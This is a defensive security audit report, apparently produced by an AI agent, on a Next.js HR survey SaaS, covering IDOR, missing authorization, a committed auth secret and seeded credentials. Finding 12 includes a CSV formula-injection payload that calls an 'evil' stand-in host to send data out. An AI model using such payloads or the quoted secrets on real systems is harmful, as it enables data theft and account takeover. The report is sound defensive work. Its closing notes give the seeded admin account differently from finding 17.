# Bug Bounty / Defensive Security Audit — TeamPulse (08-teampulse)

- **Target:** Next.js 14.2.21 SaaS — employee engagement (pulse surveys, performance reviews, AI insights, org/team management)
- **Path:** `/home/ujjwal/Documents/My Apps/apps/08-teampulse/`
- **Scope:** `src/` (22 API routes, auth, middleware), `prisma/schema.prisma`, config. node_modules skipped.
- **Authorization:** Boss's own code — authorized white-box review.
- **Date:** 2026-05-31
- **Reviewer:** security-engineer-agent (defensive-only)
- **Stack:** NextAuth (JWT/Credentials), Prisma + **SQLite**, multi-tenant by `orgId`, role field (`manager`/HR/admin per user, `member` per team-member).

> **Headline:** This app is **broadly vulnerable to IDOR / broken tenant isolation**. The codebase *has* an `orgId` tenant model and *knows how to scope* (collection routes do it correctly), but **almost every single-resource route — `/teams/[id]`, `/reviews/[id]`, pulse history, CSV export, insights, pulse-config, member delete — ignores `orgId` entirely.** Any authenticated user from Org A can read/delete/export Org B's teams, performance reviews, and raw survey responses by guessing/iterating IDs. There is also **zero role enforcement** (every authenticated user is effectively admin) and the **anonymous pulse survey is not actually anonymous** (responses are de-anonymizable + the submit endpoint is unauthenticated and unscoped, allowing forgery/ballot-stuffing). The committed `.env` ships a **hardcoded production-looking auth secret**.

---

## Severity Summary

| # | Severity | Category | Issue | Location |
|---|----------|----------|-------|----------|
| 1 | **CRITICAL** | OWASP A01 / CWE-639 (IDOR) | Cross-tenant read of any team (members, config) — no `orgId` check | `api/teams/[id]/route.ts` GET |
| 2 | **CRITICAL** | OWASP A01 / CWE-639 | Cross-tenant **DELETE** of any team — no `orgId` check | `api/teams/[id]/route.ts` DELETE |
| 3 | **CRITICAL** | OWASP A01 / CWE-639 | Cross-tenant read/PATCH of any **PerformanceReview** (salary-grade PII) | `api/reviews/[id]/route.ts` GET/PATCH |
| 4 | **CRITICAL** | OWASP A01 / CWE-639 | Cross-tenant export of raw survey responses (CSV) — no scoping | `api/surveys/[id]/export/route.ts` |
| 5 | **CRITICAL** | OWASP A07 / CWE-862 | Anonymous pulse submit is **unauthenticated + unscoped** → forgery / ballot-stuffing / data poisoning | `api/pulse/respond/route.ts` |
| 6 | **HIGH** | OWASP A01 / CWE-639 | Cross-tenant read of pulse responses (history, dashboard, insights, ai-insights, pulse-config) | 6 routes (see finding) |
| 7 | **HIGH** | OWASP A04 / CWE-863 | "Anonymous" survey is de-anonymizable; no anonymity guarantee | schema + respond flow |
| 8 | **HIGH** | OWASP A05 / CWE-798 | Hardcoded auth secret committed in `.env` (in git) | `.env` |
| 9 | **HIGH** | OWASP A01 / CWE-862 | No role/authorization model — every user is admin (create/delete teams, write reviews, send pulses) | all routes |
| 10 | **HIGH** | OWASP A01 / CWE-639 | Member delete + member add cross-tenant; `managerId` not validated | `api/teams/[id]/members/**` |
| 11 | **MEDIUM** | OWASP A01 / CWE-639 | Notification PATCH updates any notification by id (no owner check) | `api/notifications/route.ts` |
| 12 | **MEDIUM** | CWE-1236 | CSV injection / formula injection in survey export | `api/surveys/[id]/export/route.ts` |
| 13 | **MEDIUM** | OWASP A04 / CWE-770 | No rate limiting on login or pulse-submit (brute force / spam) | auth + respond |
| 14 | **MEDIUM** | OWASP A09 / CWE-209 | Auth errors leak user enumeration ("No user found" vs "Invalid password") | `lib/auth.ts` |
| 15 | **LOW** | CWE-915 | Mass-assignment on review PATCH (`...parsed.data` spread incl. `status`) | `api/reviews/[id]/route.ts` |
| 16 | **LOW** | OWASP A05 / CWE-16 | SQLite in a multi-tenant SaaS; no migrations dir; `dev.db` present | `schema.prisma` |
| 17 | **HIGH** | OWASP A07 / CWE-798 | Default/demo credentials seeded (`sarah@acme.com` / `password123`, role admin) printed to console | `prisma/seed.ts` |
| 18 | **INFO** | — | `requireAuth` pattern returns `user` but most routes never use it → silent scoping gaps | codebase-wide |

---

## Findings

### 1. CRITICAL — Cross-tenant team read (IDOR)
**[OWASP A01:2021 / CWE-639] — `api/teams/[id]/route.ts` GET (lines 12-24)**

> Impact: Any authenticated user reads ANY team in the database (name, all member names + emails, pulse config) across every customer org.
> Likelihood: HIGH — `id` is a cuid in the URL; enumerable via referenced IDs in other responses, leaked links, or brute.
> Asset: All tenants' team rosters + member PII.
> Existing mitigations: `requireAuth()` only (authn, not authz).

```ts
const team = await prisma.team.findUnique({ where: { id: params.id }, ... });
// user.orgId is fetched but NEVER compared to team.orgId
```

> Remediation:
> - Short-term: scope every single-resource lookup by tenant.
> ```ts
> const team = await prisma.team.findFirst({
>   where: { id: params.id, orgId: user.orgId },   // tenant gate
>   include: { members: true, pulseConfig: true },
> });
> if (!team) return NextResponse.json({ error: "Team not found" }, { status: 404 });
> ```
> - Long-term: a shared `getTeamForUser(id, user)` helper used by ALL team routes, OR Prisma client extension / row-level scoping so no query can skip `orgId`. Add a Semgrep rule that flags `prisma.<model>.findUnique({ where: { id` in route files.

---

### 2. CRITICAL — Cross-tenant team DELETE (IDOR, destructive)
**[OWASP A01 / CWE-639] — `api/teams/[id]/route.ts` DELETE (lines 34-36)**

> Impact: Any authenticated user **deletes ANY team in any org** by id. The route manually deletes `pulseResponse` + `weeklyInsight` first, then the team (Member/PulseConfig cascade via schema) → permanent, irreversible destruction of another customer's entire team + all its survey history. No orgId check, no role check.
> Likelihood: HIGH. Likelihood of detection by victim: HIGH (data vanishes). Likelihood of attacker success: trivial.
> Asset: All tenants' teams + members + pulse config + responses + insights.

```ts
await prisma.pulseResponse.deleteMany({ where: { teamId: params.id } }); // no orgId
await prisma.weeklyInsight.deleteMany({ where: { teamId: params.id } }); // no orgId
await prisma.team.delete({ where: { id: params.id } });                  // no orgId, no role
```

> Remediation:
> - Short-term: `deleteMany({ where: { id: params.id, orgId: user.orgId } })` and check `count === 1`; also gate on role (only manager/admin should delete).
> - Long-term: soft-delete + audit log for destructive ops; require elevated role.

---

### 3. CRITICAL — Cross-tenant Performance Review read/write (IDOR on sensitive HR PII)
**[OWASP A01 / CWE-639] — `api/reviews/[id]/route.ts` GET (23-25) + PATCH (47-53)**

> Impact: PerformanceReview holds ratings, salary-band signals, `managerNotes`, strengths/improvements — among the most sensitive data in any HR product. GET returns ANY review by id; PATCH **edits ANY review by id** across all orgs. An attacker can read a rival company's review of an employee, or tamper with reviews (change `status` to `approved`, alter `overallRating`).
> Likelihood: HIGH.
> Asset: Cross-tenant HR PII (read + integrity).
> Existing mitigations: The *collection* route (`reviews/route.ts` GET) correctly scopes by `orgId` — proving the author knows the pattern but forgot it on the `[id]` route.

```ts
const review = await prisma.performanceReview.findUnique({ where: { id: params.id } }); // no orgId
const review = await prisma.performanceReview.update({ where: { id: params.id }, ... });  // no orgId
```

> Remediation:
> - Short-term: GET → `findFirst({ where: { id: params.id, orgId: user.orgId } })`. PATCH → `updateMany({ where: { id: params.id, orgId: user.orgId }, data })` and verify count; or pre-fetch + ownership check.
> - Long-term: reviews should also enforce that only the `reviewerId`, the reviewee's manager, or HR/admin can read; reviewees shouldn't see `managerNotes`. Field-level authorization.

---

### 4. CRITICAL — Cross-tenant raw survey-response export (IDOR + privacy breach)
**[OWASP A01 / CWE-639] — `api/surveys/[id]/export/route.ts` (12-15)**

> Impact: Dumps ALL raw `PulseResponse` rows (rating + free-text answers) for ANY teamId as CSV — no `orgId` scope. This is the de-anonymization payload: an attacker exports a competitor's (or their own colleagues') raw, supposedly-anonymous feedback in bulk.
> Likelihood: HIGH.
> Asset: All tenants' raw survey free-text (highly sensitive — burnout admissions, complaints about managers).

```ts
const responses = await prisma.pulseResponse.findMany({ where: { teamId: params.id } }); // no orgId
```

> Remediation:
> - Short-term: resolve team first with `findFirst({ where: { id: params.id, orgId: user.orgId } })`; 404 if not owned; then query responses by that validated teamId. Gate export on manager/HR role.
> - Long-term: enforce k-anonymity threshold (don't export if < N responses) and audit every export. See finding 7.

---

### 5. CRITICAL — Unauthenticated, unscoped pulse submission (forgery / poisoning)
**[OWASP A07:2021 / CWE-862 Missing Authorization] — `api/pulse/respond/route.ts` (13-34)**

> Impact: This route has **NO `requireAuth()`** (intentional, for "anonymous" responses) AND no token/nonce binding the response to a real invited member or a valid pulse window. Anyone on the internet can POST unlimited `PulseResponse` rows for **any `teamId`** (teamId is enumerable). Result: ballot-stuffing, sentiment poisoning (skew a team's avg rating / alertLevel — which drives AI insights and red/yellow alerts), and DoS of the insights pipeline. Free-text `answer1/answer2` is unbounded length (no max) → storage abuse.
> Likelihood: HIGH — it's a public, unauthenticated write endpoint keyed only on a guessable id.
> Asset: Integrity of all teams' engagement data; the entire product's core metric.

```ts
export async function POST(request: NextRequest) {   // <-- no requireAuth
  ...
  await prisma.pulseResponse.create({ data: { teamId: parsed.data.teamId, ... } });
}
```

> Remediation:
> - Short-term: issue a **single-use, signed pulse token** per recipient per week (HMAC of {memberId, teamId, week} with server secret, or a random one-time token stored server-side). The respond endpoint accepts only a valid, unused token; the team is derived from the token, NOT from client input. Add length caps to free-text (`z.string().max(2000)`). Rate-limit by IP.
> - Long-term: enforce one response per token, expire tokens at window close, and decouple identity (token) from stored row so it's anonymous-by-design but un-forgeable. Hand to `backend-engineer-agent` for token issuance + `ml-engineer-agent` if insights need poisoning-resistance.

---

### 6. HIGH — Cross-tenant pulse-data read across 6 routes (IDOR)
**[OWASP A01 / CWE-639]**

All of these query by `params.teamId`/`params.id` with **no `orgId` validation** and no team-ownership check:

- `api/pulses/[teamId]/history/route.ts` (12-14) — raw responses
- `api/teams/[id]/dashboard/route.ts` (12-22) — team + last 50 responses + members
- `api/insights/[teamId]/route.ts` (12-15) — weekly insights
- `api/teams/[id]/ai-insights/route.ts` (13-15) — generates insights over another org's responses
- `api/insights/generate/[teamId]/route.ts` (13-17) — same, and **writes** a WeeklyInsight row for an arbitrary teamId
- `api/insights/action-plan/route.ts` (10-15) — `teamId` from body, unscoped
- `api/pulse-config/[teamId]/route.ts` (13-15) — reads pulse config of any team

> Impact: Full cross-tenant read of engagement data + ability to inject WeeklyInsight rows into another org.
> Likelihood: HIGH.
> Remediation: same tenant-gate pattern as finding 1; for the insights-generate write, validate team ownership before create. Centralize via `getTeamForUser()`.

---

### 7. HIGH — "Anonymous" surveys are not anonymous (de-anonymization)
**[OWASP A04:2021 Insecure Design / CWE-863]**

> Impact: The product positions pulse surveys as anonymous (`PulseRespondPage` collects no name; UI implies confidentiality), but:
> 1. `PulseResponse` stores no respondent id — yet a single-member team, or a team where only one person has responded this week, trivially identifies the author (timestamp + small N). No k-anonymity floor exists.
> 2. The CSV export + dashboard expose exact `submittedAt` timestamps and verbatim free-text, which managers can correlate to who they emailed and when. Free-text often self-identifies.
> 3. There is no enforced minimum-response threshold before a manager can view results.
> Likelihood: HIGH (inherent to design).
> Asset: Employee trust + actual confidentiality; potential legal/works-council exposure (GDPR Art. 5 data-minimization, employee-monitoring law).

> Remediation:
> - Short-term: enforce a k-anonymity gate — do not show/export results for a team-week with fewer than N (e.g. 4) responses; bucket/round timestamps to the week, not the second.
> - Long-term: explicit anonymity contract in the data model + UI ("results shown only at 4+ responses"); strip second-level timestamps; consider differential-privacy noise on aggregates. Loop in `product-manager-agent` for the anonymity policy and `compliance-officer-agent` for employee-data law.

---

### 8. HIGH — Hardcoded auth secret committed to git
**[OWASP A05:2021 / CWE-798 / CWE-321] — `.env` (committed, line 2)**

> Impact: `NEXTAUTH_SECRET="teampulse-super-secret-key-2024"` is hardcoded AND `.env` is git-tracked (`git ls-files` lists `.env`). With the signing secret known, an attacker can **forge valid NextAuth JWT session tokens** — full authentication bypass + impersonate any user/role/org. `.gitignore` only excludes `.env*.local`, NOT `.env`.
> Likelihood: HIGH if repo is/was ever pushed to any remote (Vercel, GitHub). CRITICAL-adjacent if public.
> Asset: Entire authentication system.

> Remediation:
> - Short-term: (1) **Rotate the secret immediately** to a 32+ byte random value (`openssl rand -base64 32`), set it only in Vercel/host env, never in repo. (2) Remove `.env` from git tracking: `git rm --cached .env`, add `.env` to `.gitignore`. (3) Since it's in history, treat as compromised — rotate AND, if repo was ever pushed, consider history scrub (BFG/filter-repo) + invalidate all sessions.
> - Long-term: pre-commit secret scanning (gitleaks / trufflehog) in CI; secrets via host env or a manager, never committed. Hand infra rotation to `devops-sre-agent`.

---

### 9. HIGH — No authorization/role model (broken access control)
**[OWASP A01 / CWE-862] — codebase-wide**

> Impact: The `User.role` field (`manager`/HR/admin) and `Member.role` exist but are **never checked anywhere**. Every authenticated user can: create teams, delete teams, add/remove members, write/edit performance reviews about anyone, send pulse emails, generate insights. There is no separation between a low-privilege manager and HR/admin. Combined with the IDOR findings, any user is effectively a superadmin over their own org (and via IDOR, over all orgs).
> Likelihood: HIGH.
> Asset: Org-internal privilege boundaries.

> Remediation:
> - Short-term: add a `requireRole(user, ["manager","hr","admin"])` check on mutating/sensitive routes (team delete, reviews, member management, export, pulse send). Define a role matrix.
> - Long-term: centralize authz (CASL/oso-style policy, or a per-route policy table); deny-by-default. Document the role matrix with `product-manager-agent`.

---

### 10. HIGH — Member management cross-tenant + unvalidated relations
**[OWASP A01 / CWE-639] — `api/teams/[id]/members/route.ts` (POST 40-47), `members/[memberId]/route.ts` (DELETE 12-14)**

> Impact: GET/POST members on ANY team in ANY org (no orgId/team-ownership check) — read another org's roster, inject members. DELETE (`members/[memberId]`) does scope `where: { id: memberId, teamId: params.id }` (relation validated intra-team) but **still never checks the team belongs to `user.orgId`**, so a cross-tenant attacker who knows both ids deletes another org's member. Note: `teams/route.ts` POST hardcodes `managerId: user.id` (good — no client-supplied managerId there), so the mass-assignment-of-relationship concern does NOT apply to team creation; the gap is purely the missing org gate on member read/add/delete.
> Likelihood: HIGH.
> Remediation: validate team belongs to `user.orgId` before any member op: `where: { id: memberId, team: { id: params.id, orgId: user.orgId } }` for delete; pre-resolve team by `{ id: params.id, orgId: user.orgId }` for GET/POST.

---

### 11. MEDIUM — Notification update IDOR
**[OWASP A01 / CWE-639] — `api/notifications/route.ts` PATCH (25-28)**

> Impact: `update({ where: { id } })` marks ANY notification read by id, no `userId` ownership check. Low data value but confirms the systemic pattern; can be used to hide alerts from other users.
> Remediation: `updateMany({ where: { id, userId: user.id }, data: { read: true } })`.

---

### 12. MEDIUM — CSV / formula injection in export
**[CWE-1236] — `api/surveys/[id]/export/route.ts` (19-22)**

> Impact: Free-text `answer1`/`answer2` (attacker-controlled via the unauthenticated respond endpoint, finding 5) is written into CSV with only naive double-quote wrapping and **no escaping of embedded quotes** and no neutralization of leading `=`, `+`, `-`, `@`. A response like `=HYPERLINK("http://evil/?"&A1)` or `=cmd|...` executes when a manager opens the export in Excel/Sheets → data exfiltration / RCE on the analyst's machine. Embedded `"` also breaks CSV parsing (injection of extra columns).
> Likelihood: MEDIUM (requires victim to open in spreadsheet, but that's the literal purpose of an export).
> Remediation: prefix any cell beginning with `= + - @ \t \r` with a single quote or space; escape `"` as `""`; or emit XLSX via a safe library. Combine with input caps from finding 5.

---

### 13. MEDIUM — No rate limiting (brute force + spam)
**[OWASP A04 / CWE-770] — login (NextAuth credentials) + `pulse/respond`**

> Impact: Credentials login has no throttling → password brute force / credential stuffing. `pulse/respond` (unauthenticated) has no rate limit → mass data-poisoning + storage exhaustion.
> Remediation: add IP+account rate limiting (Upstash/Redis token bucket, or Vercel middleware); exponential backoff + lockout on login; per-IP cap on respond. Hand to `backend-engineer-agent` / `devops-sre-agent`.

---

### 14. MEDIUM — User enumeration via auth error messages
**[OWASP A09 / CWE-209] — `lib/auth.ts` (24-35)**

> Impact: Distinct errors "No user found with this email" vs "Invalid password" let an attacker enumerate valid accounts (useful for targeted phishing / brute force). Also `throw new Error(...)` in `authorize` can surface raw messages.
> Remediation: return a single generic "Invalid email or password" for both branches; constant-time behavior. Don't leak which field failed.

---

### 15. LOW — Mass-assignment on review PATCH
**[CWE-915] — `api/reviews/[id]/route.ts` (47-53)**

> Impact: `data: { ...parsed.data, ... }` spreads whatever the schema allows including `status`. A reviewee (if they could reach it) could set `status: "approved"` or alter `overallRating` on their own review. Schema is the only gate; no field-level authz (e.g. only HR may change `status` to approved).
> Remediation: explicitly pick allowed fields per role; separate "submit/approve" status transitions into a dedicated, role-gated endpoint. (Note: the schema object on line 6-14 has a brace/paren mismatch `};` closing a `z.object({` — verify it compiles; may be a transcription artifact.)

---

### 16. LOW — SQLite for multi-tenant SaaS
**[OWASP A05 / CWE-16] — `schema.prisma` (6)**

> Impact: SQLite (`file:./dev.db`) is single-writer, file-based, no network ACLs, weak concurrency — unsuitable for a multi-tenant SaaS at scale and offers no DB-level isolation. `.env.example` shows Postgres was intended. No `prisma/migrations/` dir → schema drift risk.
> Remediation: move to Postgres (Neon, per Boss's other apps) for prod; add migrations; consider RLS as a defense-in-depth tenant gate behind the app-level checks.

---

### 17. HIGH — Default/demo admin credentials seeded
**[OWASP A07 / CWE-798 / CWE-1392] — `prisma/seed.ts` (137, 149-167, 580-582)**

> Impact: `npm run seed` creates `sarah@acme.com` / `password123` (role **admin**) and `mike@acme.com` / `password123` (manager), and **prints the credentials to stdout**. If this seed is ever run against (or near) a production DB — a common mistake on Vercel/Neon — anyone who reads the README or guesses the demo password logs in as org admin. Same weak password across both accounts.
> Likelihood: MEDIUM-HIGH (depends on deploy hygiene; printed creds + memorable password make it a strong target).
> Asset: Full admin access to the demo/prod org.

> Remediation: never seed real credentials into prod; gate seed to `NODE_ENV !== "production"`; use a random per-run password printed once; document seed as dev-only. If already deployed, rotate/disable these accounts.

---

### 18. INFO — `requireAuth` pattern returns `user` but routes ignore it
**Codebase-wide pattern**

> Observation: nearly every route destructures `const { error, user } = await requireAuth()` then **never references `user`** for scoping (TS would warn unused, but it's used in some). This unused-`user` is the fingerprint of the IDOR class. A lint rule "`user` must be referenced in the Prisma `where` of route handlers" or a Semgrep policy would have caught findings 1-6, 10-11 at commit time.

---

## Detection (if/when deployed)

**Sigma-style hunt (app logs / Vercel):**
- Alert on a single session accessing `teamId`/`reviewId` values whose `orgId` ≠ session `orgId` (requires logging both — add it).
- Spike in `POST /api/pulse/respond` from one IP, or responses exceeding invited member count for a team-week → poisoning.
- `DELETE /api/teams/*` volume per session > 1/min → mass-deletion.
- 4xx/login failures per IP/account > 10/5min → brute force.

**Add structured audit logging** (currently none): every mutating + export action with `{userId, orgId, targetId, targetOrgId, action}` — this is both detection and a compliance requirement.

---

## Compliance Mapping
- **OWASP Top 10 2021/2025:** A01 Broken Access Control (findings 1-6, 9-11), A04 Insecure Design (5,7,13), A05 Security Misconfig/Secrets (8,16), A07 Identification & Auth (5,13,14), A09 Logging Failures (detection gap).
- **GDPR:** Art. 5(1)(c) data minimization + Art. 32 security of processing (anonymity + IDOR on employee PII). Employee-monitoring / works-council law if EU.
- **NIST 800-53 Rev5:** AC-3 (access enforcement), AC-4 (info flow / tenant isolation), AC-6 (least privilege — role model), AU-2/AU-12 (audit), IA-5 (secret management), SI-10 (input validation).
- **SOC 2:** CC6.1 (logical access), CC6.3 (least privilege), CC7.2 (monitoring).

---

## Verification Plan (no prod exploitation)
1. **Unit/integration tests per route:** create two orgs (A, B), authenticate as A, assert every `[id]`/`[teamId]` route returns 404 for B's resources (GET, PATCH, DELETE, export). This single test matrix proves findings 1-6, 10-11 fixed.
2. **Authz tests:** low-role user gets 403 on team delete / review write / export (finding 9).
3. **Pulse-token test:** respond with no token, expired token, reused token, wrong-team token → all rejected (finding 5).
4. **Secret rotation:** confirm `.env` untracked (`git ls-files | grep -c '^\.env$'` == 0), new secret only in host env, old sessions invalidated (finding 8).
5. **CSV-injection test:** submit `=1+1` answer, export, assert cell is neutralized (finding 12).
6. **CI gates:** add Semgrep (Next.js + Prisma IDOR rules) + gitleaks; fail build on findings.
7. **Tabletop:** "Attacker has a valid login for org A and the cuid of a review in org B — what can they read/change/destroy, and would we see it?" Walk the audit-log answer.

---

## Honesty / Completeness Notes
- All 22 API route files, `lib/auth.ts`, `lib/api-helpers.ts`, `middleware.ts`, `schema.prisma`, `.env`, `.gitignore`, `next.config.js`, and the pulse-respond client page were read directly. Findings are evidence-backed with file:line.
- `prisma/seed.ts`, `lib/mock-ai.ts`, `lib/email-templates.ts`, and most `.tsx` dashboard pages were only partially/not fully read — the **seed file appears to set a known demo password (`password123`, `admin@teampulse.com`)**; confirm this isn't shipped to prod (would be a CRITICAL default-credential issue). Worth a follow-up read of `seed.ts` and `email-templates.ts` (the latter may leak the pulse link / token design).
- No SQL injection found: Prisma parameterizes all queries; SQLite + no raw SQL. No reflected XSS spotted in the routes reviewed (React auto-escapes), but the CSV injection (12) is the output-handling analog.
- Middleware protects only the `(dashboard)` *pages*, NOT `/api/*` — API auth relies entirely on per-route `requireAuth()`, which is why the unauthenticated `pulse/respond` (5) is fully exposed. Confirm no other route silently dropped `requireAuth`.
